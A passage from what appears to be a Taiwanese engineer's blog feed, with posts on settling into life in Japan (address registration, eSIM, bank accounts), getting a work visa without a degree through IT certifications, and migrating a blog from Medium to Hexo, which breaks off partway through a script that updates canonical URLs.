翻譯）</p><p>然後有個可能比較麻煩的點，那就是有些房屋需要實體鑰匙，這種就需要提供日本的收件地址，他們會寄鑰匙給你，目前沒辦法自取。所以如果想要一到日本就入住短租的，我也不知道該怎麼辦，有朋友的可能朋友幫忙代收，沒朋友的話就無解了，或許要先住一個晚上的飯店。</p><p>我自己住的是電子密碼鎖的那種，就不需要這個流程，入住前一天會把密碼寄給你，就可以自己入住。還有一個比較麻煩的是住這種的話生活用具都需要自備，毛巾牙刷牙膏垃圾袋之類的，都記得要準備一下。</p><h2 id="第五關：區役所登記住址"><a href="#第五關：區役所登記住址" class="headerlink" title="第五關：區役所登記住址"></a>第五關：區役所登記住址</h2><p>順利入住以後，就可以去區役所登記住址啦！</p><p>話說我一直有個疑惑，那就是有些人會說「入境後的 14 天內要登記住址」，但很多官方規定其實是寫「確定住址後的 14 天內」，那到底怎麼叫做確定住址？我先住飯店然後找長期租房，這樣叫做確定住址嗎？是只要「確認現在住哪裡」就算，還是「長期住宿確定住哪裡」才算？</p><p>我也不知道答案，但總之入境後的 14 天內登記住址是最保險的。而且沒有登記住址的在留卡基本上沒什麼效力，所以儘快登記是最好的。</p><p>我住的地方是淺草，台東區的區役所是早上八點半開門，我大概是 8:40 左右抵達的，人不多，到那邊之後用前一天先查好的日文講出「住所登記」這個單詞，就可以比手畫腳得到現場工作人員的指導，會給你表格讓你填。</p><p>因為日文很多發音其實跟中文滿像，而且很多表格上的字也是漢字，所以大部分都知道怎麼填，不知道的開 Google 圖片翻譯出來也可以。填完以後抽號碼牌排隊，大概等了兩三分鐘就輪到了。</p><p>辦理的時候會問一些問題，例如說什麼時候入境，什麼時候入住之類的，有些聽不懂的我直接拿手機的 Google 翻譯出來，開啟對話模式，基本上沒什麼問題。</p><p>辦理途中對方有拿出一個表格，上面是很多列好的問題，有中日文對照版，例如說：</p><ol><li>要不要申請 my number</li><li>有沒有帶租屋合約</li></ol><p>諸如此類的，其實我覺得這個很棒欸，先把常見問題列出來，就可以全程比手畫腳了，突破語言障礙。</p><p>總之呢，因為我沒帶租屋合約就跟他說沒帶，他也沒有說不能辦，就繼續流程了。網路上可以查到有些心得文說登記住址不用看合約，看來確實要看承辦人員。</p><p>除了登記住址，記得跟他說要辦 My Number Card，這個比起在留卡其實更像身分證一點，但不會當場拿到卡片，那個又是另外一個任務。但可以當場知道號碼，記得要說你想知道。</p><p>然後可以順便申請住民票，公司入職或是銀行開戶會用到，我一次申請了三張，對方有問我說是要幹嘛的，我說金庫、會社跟 backup（請用日文唸），他就點點頭。</p><p>話說住民票滿酷的，會跟你確認上面要有什麼資訊，有些資訊你是可以隱藏的，不過我是全部都沒隱藏就是了，怕有什麼不該隱藏的卻隱藏了，到時候還要再辦一次，很不方便。</p><p>資料填完確認完以後，就先被請去旁邊等了，等了大概五到十分鐘，就可以拿到住民票以及登記好的在留卡，整個流程就結束了。</p><p>以我零日文的背景來說，雖然整體流程不能說很順，但確實沒碰到什麼大問題，有問題拿 Google 翻譯出來就對了，現在都什麼年代了。所以，不會日文也沒關係，大膽地去辦吧！</p><p>時間軸：</p><ul><li><code>08:40</code> 抵達區役所，填資料</li><li><code>08:45</code> 開始申辦</li><li><code>09:00</code> 手續辦好開始等文件</li><li><code>09:20</code> 完成</li></ul><p>預計大概需花費 30 ~ 60 分鐘。</p><h2 id="第六關：手機門號"><a href="#第六關：手機門號" class="headerlink" title="第六關：手機門號"></a>第六關：手機門號</h2><p>日本有三大電信公司：Softbank、Docomo 以及 au，而有許多格安電信（就比較便宜的）也是用這三家的線路，價格更便宜然後更彈性一點。</p><p>在朋友的推薦之下，我辦了 <a href="https://povo.jp/procedure/new/">Povo</a>，目前使用上相當滿意。</p><p>Povo 的優點是全線上申請，而且如果你的手機支援 eSIM 的話，從申請送出到開通 eSIM，不到半小時就搞定了。雖然官網上面有列支援的裝置，但我自己實測的結果是你只要有確認自己的手機支援 eSIM 基本上就沒問題了。</p><p>舉例來說，我的手機 Nokia G60 在日本根本沒賣，但我確定支援 eSIM，最後也確實可以用。</p><p>Povo 的申請會需要用他們家的 App（<a href="https://play.google.com/store/apps/details?id=com.kddi.kdla.jp&hl=en_US">Android</a>、<a href="https://apps.apple.com/jp/app/povo2-0%E3%82%A2%E3%83%97%E3%83%AA/id1554037102">iOS</a>），要完成整個申請流程需要有登記好住址的在留卡，但我有一個小祕技。</p><p>那就是要辦住址登記的前一晚可以先把 app 載好，然後開始填除了 KYC 以外的資料，這樣隔天登記好住址就可以繼續流程，加速申請過程。</p><p>辦的時候可以填推薦碼，我的是： <code>LNCGSXCT</code></p><p>用了以後你會獲得一天的免費無限制流量，可以順便測一下訊號怎麼樣，或是分享給電腦使用，而我會獲得 3GB 的額外流量。</p><p>Povo 沒有基本費，所以就流量費用外加講電話的費用，流量的話一個月 3GB 是 990 日幣，20GB 的話是 2700 日幣，不過我最後用的是有個期間限定的專案，一年總共 12GB，12000 日幣，等於是一個月 10GB 1200 日幣，覺得滿適合我的，就選了這個。</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p3.png" alt="povo"></p><p>時間軸：</p><ul><li><code>09:40</code> 開始拍各種照片進行 KYC</li><li><code>09:50</code> povo 線上申請 KYC 完畢</li><li><code>09:55</code> 收到通過通知，拿到 eSIM QRCode</li><li><code>10:00</code> 根據官網教學設置完畢，確定可以用</li></ul><p>我登記住址跟辦理 povo 是在同一天，所以我 8:40 去辦登記住址，9:20 辦完，走回飯店以後開始申請 povo，10 點拿到門號，在 90 分鐘以內解完了兩個新手任務，povo 加上 eSIM 太神啦！</p><h2 id="第七關：銀行"><a href="#第七關：銀行" class="headerlink" title="第七關：銀行"></a>第七關：銀行</h2><p>根據我上網查過的資料，外國人就算有了工作簽證，要在日本開戶難度也還是很高，雖然說有幾間對外國人比較友善的銀行，像是新生銀行或是中國信託底下的東京之星等等，但依舊很難。</p><p>我朋友自己跑過的經驗是只有日本郵局ゆうちょ銀行是能夠開到的，其他如果沒有公司幫忙，而且自己又不會講日文的話，幾乎是不太可能開到。</p><p>已經聽朋友這樣說，我就沒有自己親身實測了，直接去辦最簡單的ゆうちょ銀行，要去現場開戶的話，請記得要找最近的，每個分行的地址可以看這裡：<a href="https://www.jp-bank.japanpost.jp/kojin/access/kj_acs_arealist.html">https://www.jp-bank.japanpost.jp/kojin/access/kj_acs_arealist.html</a></p><p>看網路上是說如果離居住地不是最近的，會不給開，要你去最近的那一間。</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p4.jpg" alt="japan post bank"></p><p>我當時是去了最近的淺草店，去了之後跟行員說：「我不會日文，可以開帳號嗎？」，當然也是前一天先用 Google 翻譯翻好然後學起來，行員就拿出一個表格說要先預約，我是週四去的，預約已經排到下週二以後了。</p><p>我想說下週已經去公司上班了，公司會幫忙開另一個，於是就沒有預約了。</p><p>回家之後我用了朋友推薦的方式自己上網開戶，教學我是參考這一篇：<a href="https://www.willstudy.tw/japan-bank-opening-jpbank/">日本銀行開戶指南 | 郵貯銀行【ゆうちょ銀行】線上帳戶申辦教學</a></p><p>過程我記得滿順利的，但倒是等了滿久。</p><p>我 10&#x2F;5（四）線上申請郵局帳戶，一直到 10&#x2F;20（五）才拿到提款卡，需要兩週的時間。如果急需帳戶的話，建議還是去實體店面，似乎可以當場拿到提款卡。</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p5.jpg" alt="郵局提款卡"></p><p>另一個帳號是公司幫忙開的三井住友，基本上一樣就是填寫資料，會由公司那邊幫忙寄送資料給銀行。我是 10&#x2F;11（三）申請的帳號，一直到 10&#x2F;28（六）才收到提款卡，所以也大概是兩週左右。</p><p>在收到提款卡之前有先收到一個可愛的通知信，裡面會先跟你講你的銀行帳號：</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p6.jpg" alt="三井住友通知"></p><h2 id="同場加映：去郵局領取掛號信以及重設密碼"><a href="#同場加映：去郵局領取掛號信以及重設密碼" class="headerlink" title="同場加映：去郵局領取掛號信以及重設密碼"></a>同場加映：去郵局領取掛號信以及重設密碼</h2><p>在日本有些信件跟台灣的掛號一樣，需要本人簽收，沒有人的話就會留下一張簡稱為「不在票」的通知單，上面會寫說包裹的編號，然後有一個 QRCode 可以掃描，掃描之後就可以預約下次送件的時間，或是也可以改成自己去領取。</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p7.jpg" alt="不在票"></p><p>像是提款卡就是需要本人簽收的東西，所以我收過兩次不在票了。</p><p>因為我附近的淺草郵局假日也有開，因此我都是直接預約去郵局領取。領取的過程其實滿簡單的，就把不在票帶去給工作人員，然後他就會去拿信，接著出示在留卡驗明身份跟地址，你再檢查一下是不是自己的信，就完成了。</p><p>零日文也可以領取，沒問題的。</p><p>然後，另一個故事是我在線上申請郵局帳戶時，因為距離收到提款卡已經兩週了，忘記當初設的密碼（叫做暗証番号，就是去 ATM 領錢時要按的密碼），輸入錯誤超過三次直接被鎖卡，只好跑一趟郵局解鎖。</p><p>我到那邊的時候直接用手機出示這個網頁給行員看：<a href="https://faq.jp-bank.japanpost.jp/faq_detail.html?id=726">https://faq.jp-bank.japanpost.jp/faq_detail.html?id=726</a></p><p>行員就跟我要提款卡，然後讓我填一些資料，填完之後去一旁稍等，大概一兩分鐘就好了。然後我用 Google 翻譯問他：「所以我會收到新的密碼嗎？」，他說：「直接用之前設定的那組就好」</p><p>所以行員幫我做的是清除錯誤紀錄，而不是更新密碼，不過幸好之前設定的那組我有想起來，所以沒什麼問題。如果真的忘記的話，似乎是會把新的密碼寄到戶籍地址，又要再多等個幾天。</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>以上就是從拿到在留許可一直到在日本「稍微」安頓下來，過五關斬六將的流程。之所以會用「稍微」，是因為這還不是終點，還有其他新手任務沒有解開，像是 My Number Card 或是大魔王租房，而租房又會開啟其他如水電網路以及家具的支線任務，租房絕對是 Boss 級別的怪物，目前我也還在打 Boss 的路上，過關以後會再單獨寫一篇。</p><p>目前來日本跑這些新手任務的心得是不會日文也沒什麼大礙，基本上都可以順利通過，因為都是面對面，碰到問題的時候比手畫腳或是開大絕把 Google 翻譯拿出來就對了。</p><p>真正難的大概是需要電話的場合，那就真的無解了。</p><p>另外，有很多服務都可以純線上辦理，像是手機門號以及郵局開戶，這些對我這種不會講日文的外國人來說，真的很方便。</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>感謝前輩們的心得文，底下文章惠我良多：</p><ol><li><a href="https://uxbackpacker.blogspot.com/2019/06/check-list.html">[日本・東京] 日本落地攻略 check-list</a></li><li><a href="https://medium.com/engineercurry/%E6%97%A5%E6%9C%AC%E5%85%A5%E4%BD%8F%E5%85%B6%E5%AF%A6%E4%B9%9F%E6%B2%92%E9%82%A3%E9%BA%BC%E9%9B%A3-%E5%9C%A8%E7%95%99%E5%8D%A1%E4%BD%8F%E5%9D%80%E7%99%BB%E9%8C%84-%E8%BE%A6-line-mobile-%E9%96%80%E8%99%9F-%E9%96%8B%E6%88%B6-977d5683dee6">日本入住其實也沒那麼難 — 在留卡住址登錄、辦 Line Mobile 門號、開戶</a></li><li><a href="https://tigercosmos.xyz/post/2022/08/japan/before-work-in-japan/">2022 赴日本東京工作全方位教戰手冊</a></li><li><a href="https://chris-yn-chen.medium.com/%E8%BE%A6%E7%90%86%E6%97%A5%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%B0%BD%E8%AD%89%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB-e2da5e36eef0">辦理日本工作簽證經驗分享</a></li><li><a href="https://blog.itsninayeh.com/2023/03/15/tokyo-life-step-one/">東京生活開始｜在留卡與住民票登錄經驗分享（2022 年底）</a></li><li><a href="https://halohalocouple.com/must-do-list-after-arrival/">入境日本後該做什麼 – 住民登錄 &amp; 必備三卡申辦全紀錄</a></li><li><a href="https://ithelp.ithome.com.tw/users/20111777/ironman/2767">到日本當軟體工程師的入門指南</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高中學歷大學沒畢業申請日本工作簽證心得</title>
      <link href="/2023/10/22/japan-working-visa-without-college-degree/"/>
      <url>/2023/10/22/japan-working-visa-without-college-degree/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前陣子因為要辦日本的工作簽證，所以找了一些資料。關於「只有高中學歷能不能辦到日本工作簽證」這件事情，網路上的中文討論其實很少，雖然可以找到零星一兩個成功案例，但也可以看到很多人會說高中學歷辦不過，或甚至有些討論著重的點變成「先找願意錄取你的公司再說」，已經不是在討論簽證了。</p><p>這一篇不考慮「如何在日本找到軟體工程師的工作」，只考慮「高中學歷申請日本工作簽證（技術・人文知識・国際業務）」這件事情，來講一講我找到的規定以及辦理成功的紀錄。</p><p>因為大學只唸了一年半就休學的緣故，我的最高學歷是高中畢業（以前有發現沒有高中畢業證書也可以唸大學，想說如果學分不夠就乾脆不拿了，只拿結業證書，現在想起來幸好沒這麼幹…），老實說這個身份在我的職涯過程中影響不大。</p><p>畢竟一來軟體工程師這行學歷本來就沒這麼重要，二來我也沒有想要去那些會看學歷的大公司，因此一路走來都沒碰到什麼太大的問題，直到我開始出國工作。</p><h2 id="學歷的差別"><a href="#學歷的差別" class="headerlink" title="學歷的差別"></a>學歷的差別</h2><p>2016 年我去新加坡工作時，就有感受到學歷對於出國工作的重要性。新加坡的工作簽證有分成幾種不同的類型，以我們這種軟體工程師而言，大部分拿的應該都會是 SP（S Pass）或是 EP（Employment Pass），EP 的等級比較高，如果要幫家屬申請簽證或是申請永久居民之類的，EP 都會更有利一點。</p><p>以我那時候去新加坡拿的薪水來看，照理來講應該是要拿 EP，但最後高機率是因為學歷的關係，只拿到了 SP，是一年後再換工作，才拿到了 EP。</p><p>雖然對我來說其實沒什麼差，但由此可見學歷對於申請國外的工作簽證是會有影響的（當然也要看各國規定啦）。這是我休學以後的十年間，唯一感受到沒有大學學歷的不方便之處。</p><h2 id="日本的工作簽證規定"><a href="#日本的工作簽證規定" class="headerlink" title="日本的工作簽證規定"></a>日本的工作簽證規定</h2><p>其實好幾年前就有考慮過去日本工作了，那時候稍微查一下規定，看到有一種說法是：「高中學歷沒辦法辦工作簽證」，當時沒有仔細研究，但從那之後對這個說法就一直有印象。</p><p>前陣子因為要來日本工作的緣故，自己也稍微研究了一下簽證的相關規定，底下會整理一些我找到的東西。先聲明一下，我只是因為興趣愛好所以研究，沒有任何自己申請簽證的實務經驗，也不是合格的行政書士，所以僅供參考。</p><p>來日本工作的軟體工程師拿的簽證通常有兩種，一個是高度人才，另一種是「技術・人文知識・国際業務」，俗稱技人國簽證。根據我的理解，就算高度人才分數有到申請標準，但若是申請資格連技人國都沒有符合，也是拿不到簽證的，所以接下來就講一下技人國的規定是什麼。</p><p>在日本出入國在留管理廳（以下簡稱入管局）的網頁中，可以在<a href="https://www.moj.go.jp/isa/applications/status/gijinkoku.html?hl=ja">在留資格「技術・人文知識・国際業務」</a>的頁面找到相關資訊。</p><p>這邊把申請分成四個類別：</p><p><img src="/img/japan-working-visa-without-college-degree/p1.png" alt="申請分類"></p><p>如果是有在日本上市的公司，會屬於第一個類別，而其他一些小公司大多數應該會是第三或第四個類別。</p><p>在網站更底下可以看到「提出書類 」，如果是第一以及第二個類別，可以看到基本上不需要提供任何資料。而第三四個類別，會需要提出申請人的學歷以及經歷證明。</p><p><img src="/img/japan-working-visa-without-college-degree/p2.png" alt="提出資料"></p><p>由於前兩個類別不需要提出申請人的學經歷證明，因此有種說法是如果要去的是前兩類的公司，就算高中畢業也能通過，沒有太大的問題（不知道該怎麼證實或是證偽，因此只是寫在這邊給大家參考而已）。</p><p>上面只有寫到要提交哪些資料而已，並沒有寫說怎樣的條件會通過，而條件的部分有一個 <a href="https://www.moj.go.jp/isa/publications/materials/nyukan_nyukan69.html?hl=ja">「技術・人文知識・国際業務」の在留資格の明確化等について</a> 的頁面，上面有個<a href="https://www.moj.go.jp/isa/content/001343658.pdf">「技術・人文知識・国際業務」の在留資格の明確化等について</a>的檔案，裡面寫得很清楚。</p><p>以工程師為例的話，條件就兩個：</p><p>第一，你要是相關科系的大學或是專門學校畢業：</p><p><img src="/img/japan-working-visa-without-college-degree/p3.png" alt="學歷要求"></p><p>第二，你有 10 年以上的實務經驗：</p><p><img src="/img/japan-working-visa-without-college-degree/p4.png" alt="實務經驗"></p><p>兩者符合一個，原則上就可以通過了。</p><p>由此可見，「只有高中畢業辦不到技人國工作簽證」這個說法也是相當合理的，畢竟規定就寫在這裡了。</p><p>接著來看一下法源依據，在入管局的網站上可以找到這份 PDF：<a href="https://www.moj.go.jp/isa/content/001366995.pdf">https://www.moj.go.jp/isa/content/001366995.pdf</a></p><p>可以看到法源依據是：「出入国管理及び難民認定法第七条第一項第二号の基準を定める省令」</p><p><img src="/img/japan-working-visa-without-college-degree/p5.png" alt="法源依據"></p><p>這個條文也有網頁版，在這裡：<a href="https://elaws.e-gov.go.jp/document?lawid=402M50000010016#:~:text=%E7%94%B3%E8%AB%8B%E4%BA%BA%E3%81%8C-,%E8%87%AA%E7%84%B6%E7%A7%91%E5%AD%A6,-%E5%8F%88%E3%81%AF%E4%BA%BA%E6%96%87%E7%A7%91%E5%AD%A6">e-gov 法令檢索</a></p><p>內容跟 PDF 一樣，而仔細看的話，會看到有個地方在前面看的「在留資格の明確化」裡面沒有寫到：</p><blockquote><p>申請人が自然科学又は人文科学の分野に属する技術又は知識を必要とする業務に従事しようとする場合は、従事しようとする業務について、次のいずれかに該当し、これに必要な技術又は知識を修得していること。ただし、申請人が情報処理に関する技術又は知識を要する業務に従事しようとする場合で、法務大臣が告示をもって定める情報処理技術に関する試験に合格し又は法務大臣が告示をもって定める情報処理技術に関する資格を有しているときは、この限りでない</p></blockquote><p>ChatGPT 幫我翻譯的結果是：</p><blockquote><p>申請人如欲從事屬於自然科學或人文科學領域的需要特定技術或知識的工作，則應符合以下任一情況，並已獲得所需技術或知識。但若申請人欲從事涉及資訊處理技術或知識的工作，且已通過法務大臣所定的有關資訊處理技術考試或持有法務大臣所定的有關資訊處理技術資格者除外。</p></blockquote><p>如果翻譯沒錯的話，大意就是如果要申請相關工作的簽證，應該符合以下情況（就之前講的那兩個，學歷跟十年工作經驗），但如果有所謂的「法務大臣所定的有關資訊處理技術資格者」除外。</p><p>那到底哪些資格是有效的呢？</p><p>在<a href="https://www.moj.go.jp/isa/laws/nyukan_hourei_index.html?hl=ja">出入国管理関係法令等</a>網頁中可以看到一個「ＩＴ告示」，標題為：<a href="https://www.moj.go.jp/isa/laws/nyukan_hourei_h09.html?hl=ja">出入国管理及び難民認定法第七条第一項第二号の基準を定める省令の技術・人文知識・国際業務の在留資格に係る基準の特例を定める件</a>，裡面就定義了到底有哪些考試是算數的。</p><p>裡面有列出了三個台灣的考試：</p><p><img src="/img/japan-working-visa-without-college-degree/p6.png" alt="證照清單"></p><p>不過如果實際去查，會發現：</p><ol><li>已經沒有「軟體設計專業人員」這個考試了</li><li>「網路通訊専業人員」跟「資訊安全管理専業人員」現在已經是「電腦技能基金會」主辦，而非資策會。</li></ol><p>這兩個考試的連結如下：</p><ol><li><a href="https://www.itest.org.tw/07_sm.asp">https://www.itest.org.tw/07_sm.asp</a></li><li><a href="https://www.itest.org.tw/07_nc.asp">https://www.itest.org.tw/07_nc.asp</a></li></ol><p>由於網路上的資料真的很少，因此不確定這兩個考試是否依舊被日本認可。</p><p>但沒關係，至少整理資料到這邊，我們對於日本 IT 人員的工作簽證有了新的認識。</p><h2 id="整理目前為止看到的法規"><a href="#整理目前為止看到的法規" class="headerlink" title="整理目前為止看到的法規"></a>整理目前為止看到的法規</h2><p>法規寫得很清楚，如果要申請自然科學領域的工作簽證，必須要是大學或是專門學校的相關科系畢業，或者是十年以上的實務經驗。</p><p>從這點來看，確實大學沒畢業的話，是不符合資格的，除非你有十年以上的實務經驗。</p><p>但是呢，還好法條上有寫一個但書，那就是有拿到許可的證照的話不在此限。因此，對我們這種沒有大學畢業也沒有十年實務經驗的人來說，就只有這一條路可以選擇了。</p><p>之前找到的國外網站的資訊也是這麼講的：</p><ol><li><a href="https://ib-tec.co.jp/career-advice/itpec-exam-be-an-engineer-in-japan-without-a-degree/">The 2 Ways to Get a Visa Without a Degree</a></li><li><a href="https://japan-dev.com/blog/getting-a-visa-as-an-engineer-in-japan">How to get a visa as an engineer in Japan</a></li><li><a href="https://www.youtube.com/watch?v=9p-sYsR8vQU&ab_channel=Davetastic">Japanese Engineering Visa Without Degree?</a></li></ol><p>總之呢，我最後是選擇了考證照這一條路，心得之前也有分享過，可以參考：<a href="https://blog.huli.tw/2023/04/14/how-to-prepare-japan-fe-and-sg-exam/">零日文基本情報技術者與情報セキュリティマネジメント試験準備心得</a>。</p><p>這兩個考試的合格標準都是 600 分，滿分 1000 分。</p><p>我自己的分數的話，情報セキュリティマネジメント是 745 分，基本情報技術者 A 科目 715 分，B 科目 905 分。</p><h2 id="時間軸"><a href="#時間軸" class="headerlink" title="時間軸"></a>時間軸</h2><p>最後來分享一下這整次的時間軸，讓大家有個概念：</p><ul><li><code>2023-03-18</code> 申請【SG】情報セキュリティマネジメント試験</li><li><code>2023-03-20</code> 申請【FE】基本情報技術者試験</li><li><code>2023-04-09</code> 【SG】情報セキュリティマネジメント試験考試</li><li><code>2023-04-10</code> 【FE】基本情報技術者試験考試</li><li><code>2023-05-10</code> 正式公告成績（但考完當下就會知道分數以及是否合格）</li><li><code>2023-06-14</code> 寄出證書</li><li><code>2023-06-15</code> 收到證書（只能寄到日本，因此寄到我在日本的朋友家裡）</li><li><code>2023-06-23</code> 送出簽證申請</li><li><code>2023-09-11</code> 申請通過，拿到在留許可</li></ul><p>從時間軸很明顯可以看到有兩個地方等了特別久。</p><p>第一個是雖然考試結束就可以立刻知道成績，但是要等到收到證書才可以開始辦理簽證，而考試結束到拿到證書需要兩個月，只能慢慢等。因此，我會建議大家如果未來有計劃前往日本工作，又跟我一樣需要這張證照的話，去日本玩的時候順便去考吧，真的需要的時候就不用多等兩個月。</p><p>第二個是辦理簽證的速度，這邊似乎會根據公司狀況、個人狀況以及整體的申請狀況而定，我的話等了兩個半月，是我自己聽過的案例中很長的了，其他朋友比較多都是一個月左右就拿到了。</p><p>送出申請時的資料狀況大概是：</p><ol><li>學歷高中畢業</li><li>IT 相關工作經驗七年</li><li>兩張日本認可的 IT 證照</li></ol><p>以這樣的背景通過了入管局的審查，順利取得了簽證。</p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>無論資格是否符合，我其實都滿推薦去考我考的那兩張證照，原因是一張證照高度人才可以加五分，兩張就加十分了（上限就是兩張），還是滿有幫助的。</p><p>當初在找資料的時候，可能是這個背景本身就比較稀有（高中畢業、軟體工程師、要到日本工作），所以網路上的資料真的很少，因此當時就決定等一切塵埃落定，一定要寫一篇心得文分享一下。</p><p>以上大概就是這次辦理日本工作簽證時的心得分享，希望對跟我一樣背景的人有幫助。</p>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再會了，Medium 搬家到 Hexo 心得</title>
      <link href="/2023/10/09/goodbye-medium/"/>
      <url>/2023/10/09/goodbye-medium/</url>
      
        <content type="html"><![CDATA[<p>說要從 Medium 搬家說了很久，這次總算付諸行動啦！</p><p>這篇就來記錄一下搬家的理由以及心得。</p><h2 id="搬家的理由"><a href="#搬家的理由" class="headerlink" title="搬家的理由"></a>搬家的理由</h2><h3 id="一、使用者體驗變差"><a href="#一、使用者體驗變差" class="headerlink" title="一、使用者體驗變差"></a>一、使用者體驗變差</h3><p>無論是免費文章還是付費文章，如果沒有登入 Medium 的話，在看文章的時候都會跳一個好大的視窗要你登入，使用者體驗很差。</p><p>雖然這改很久了，但我是之前偶然間才發現原來體驗這麼差（因為平時都有登入）。</p><h3 id="二、平台流量日漸變低"><a href="#二、平台流量日漸變低" class="headerlink" title="二、平台流量日漸變低"></a>二、平台流量日漸變低</h3><p>雖然說我不是什麼大尾 YouTuber，但我大概可以體會得到，當一位百萬訂閱的 YouTuber 過氣或是不受演算法眷顧之後，會有什麼感覺。</p><p>我的 Medium 訂閱人數有 12000 人，儘管這個絕對數字看起來並不高，但相對來看已經是很高的了。根據我之前的<a href="https://life.huli.tw/2019/07/02/medium-analysis-40752b9efa03/">調查</a>，這樣的訂閱人數在台灣的個人帳號之中，可以排到前三名。</p><p>但從文章的觀看次數來看，我絲毫不覺得訂閱數有這麼高。</p><p>如果文章只發在 Medium 而且不貼在任何社群平台，大約是 500 個不重複觀看，也就是訂閱人數的 4%，感覺滿淒慘的。</p><p>另外，Medium 從以前就一直推廣付費牆，但我個人很不喜歡付費牆，所以自己的文章也不會弄這個東西，因此也得不到 Medium 的演算法青睞。</p><p>總之呢，我覺得在台灣好像寫 Medium 的人越來越少，很多訂閱數高的也早就搬家到其他地方了。</p><h3 id="三、為長遠的未來做打算"><a href="#三、為長遠的未來做打算" class="headerlink" title="三、為長遠的未來做打算"></a>三、為長遠的未來做打算</h3><p>Medium 一直以來都只是個暫時的地方，畢竟任何平台都會有倒閉或是改版的可能。</p><p>如果想要寫一輩子的話，待在 Medium 越久，絕對不是件好事。待得越久，累積的東西就越多，就更難搬家了。</p><p>以長期來看，越早搬家成本越低，而且搬家以後所有事情都在自己的掌握之內，自由度高很多。</p><p>綜合以上三點，最後決定搬家了。</p><h2 id="搬家心得"><a href="#搬家心得" class="headerlink" title="搬家心得"></a>搬家心得</h2><h3 id="搬到哪裡去？"><a href="#搬到哪裡去？" class="headerlink" title="搬到哪裡去？"></a>搬到哪裡去？</h3><p>首先呢，最後是搬到自己架的 Hexo 部落格，會選這套是因為我另外一個技術部落格也用這套，兩個用同一套碰到問題比較容易修，至少這一套我比較熟。</p><p>雖然也有考慮過其他現成服務，但既然都要搬了，還是搬到自己熟悉的地方最好。原本也有考慮 WordPress，但考量到需要維護一個後端，而且還要時時刻刻注意資安問題，有點太累了，還是 Hexo 這種靜態網頁產生的框架最方便而且維護成本最低。</p><p>這次還特別挑選了 Hexo 的版型，挑了兩三天以後終於找到一個喜歡的：<a href="https://github.com/haojen/hexo-theme-Claudia">https://github.com/haojen/hexo-theme-Claudia</a></p><p>真的很感謝這個版型的作者，讓我省了好多時間，要挑到喜歡的真的很不容易。</p><h3 id="搬家過程"><a href="#搬家過程" class="headerlink" title="搬家過程"></a>搬家過程</h3><p>文章的部分是參考這一篇：<a href="https://notes.desktopofsamuel.com/posts/%E8%AB%87%E5%86%8D%E6%95%B4%E7%90%86%E8%87%AA%E5%B7%B1%E7%9A%84%E6%96%87%E7%AB%A0%E4%B8%8A-5%E5%88%86%E9%90%98%E5%8C%AF%E5%87%BA-medium-%E5%92%8C-wordpress-%E6%96%87%E7%AB%A0%E8%87%B3-Markdown">談再整理自己的文章（上） — 5分鐘匯出 Medium 和 Wordpress 文章至 Markdown</a></p><p>裡面有提到這個：<a href="https://github.com/gautamdhameja/medium-2-md">medium-2-md</a> 套件可以用。</p><p>稍微研究了一下這個套件，可以看到最重要的轉換部分，是使用了一個叫做 <a href="https://github.com/gautamdhameja/medium-2-md/blob/master/lib/converter.js#L1C34-L1C42">turndown</a> 的東西，感覺滿有趣的。</p><p>在使用 medium-2-md 的時候有碰到一些問題，因為程式碼滿少的，所以就自己 clone 以後開始修了，修成自己想要的形狀。</p><p>改的東西大概有：</p><ol><li>修改圖片下載的檔名</li><li>修改圖片路徑</li><li>修改 front matter 的資訊</li><li>修改檔名，讓檔名就是原本 medium 的 slug（這很重要）</li></ol><p>改完之後其實部落格的文章跟圖片基本上就搬的差不多了，但剩下很多小細節要修。</p><p>medium-2-md 本身的一個問題是碰到 Medium 上的那種 import 網址進來瀏覽的狀況會出問題，產生的 markdown 會變得很詭異，這邊因為數量沒有很多，我是手動修的。</p><p>其他還修了兩個地方，一個是 SEO 最重要的 canonical link。</p><p>在 Medium 的文章設定頁面可以設定 canonical，要把這個設置到自己新的文章位置，否則 Google 會判定為重複內容。由於我大概有 130 篇文章，要手動實在是有點累，就快速寫了一個 code 去做了。</p><p>這邊有一點很重要的是當初搬家時我保持 slug 不變，所以要做這個超級快。我先把我部落格的新網址全部抓下來，然後用程式跑一遍就結束了：</p><pre><code class="js">const cheerio = require(&#39;cheerio&#39;);// 所有文章網址let urls = `/2023/09/22/coolwallet-pro-b381f545878//2023/08/30/frontend-choice-2f9f76a1614e//2023/07/30/myflightradar24-flight-tracker-120ec0c162e6//2023/07/27/2023-july-korea-trip-seoul-92ba2d0608ff//2023/07/27/2023-july-korea-trip-busan-a475e484e1fc//2023/07/01/2023-06-macau-travel-venetian-21687588b87d//2023/05/26/2023-jp-travel-eed64a0cb3a0/`.split(&#39;\n&#39;)const sleep = ms =&gt; new Promise(r =&gt; setTimeout(r, ms))async function main() &#123;  for(let url of urls) &#123;    await update(url)    await sleep(1000)  &#125;&#125;async function update(url) &#123;  let path = url.split(&#39;/&#39;)  let id = path[path.length - 2].split(&#39;-&#39;).at(-1)  const fullUrl = &#39;https://life.huli.tw&#39; + url  // 拼出完整網址跟文章 ID  console.log(fullUrl, id)  // 打 API 更新  return fetch(&#39;https://medium.com/_/graphql&#39;, &#123;    method: &#39;POST&#39;,    headers: &#123;      &#39;Graphql-Operation&#39;: &#39;SetCanonicalUrl&#39;,      &#39;Origin&#39;: &#39;https://medium.com&#39;,      &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 